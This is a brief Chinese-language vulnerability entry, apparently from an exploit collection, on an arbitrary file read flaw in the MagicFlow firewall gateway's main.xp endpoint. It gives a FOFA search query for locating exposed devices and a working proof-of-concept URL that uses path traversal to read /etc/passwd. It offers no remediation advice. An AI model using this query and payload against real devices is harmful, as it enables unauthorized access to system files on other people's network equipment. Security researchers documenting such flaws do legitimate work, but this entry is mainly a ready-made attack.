---
title: MagicFlow 防火墙网关 main.xp 任意文件读取漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - MagicFlow
---

# MagicFlow 防火墙网关 main.xp 任意文件读取漏洞

## 漏洞描述

MagicFlow 防火墙网关 main.xp 存在任意文件读取漏洞，攻击者通过构造特定的Url获取敏感文件

## 漏洞影响

> [!NOTE]
>
> MagicFlow 防火墙网关

## FOFA

> [!NOTE]
>
> app="MSA/1.0"

## 漏洞复现

登录页面如下

![image-20210609181301702](/img/20210924020228977583.png)

构造POC

```
/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd
```

![image-20210609182245927](/img/20210924020229441755.png)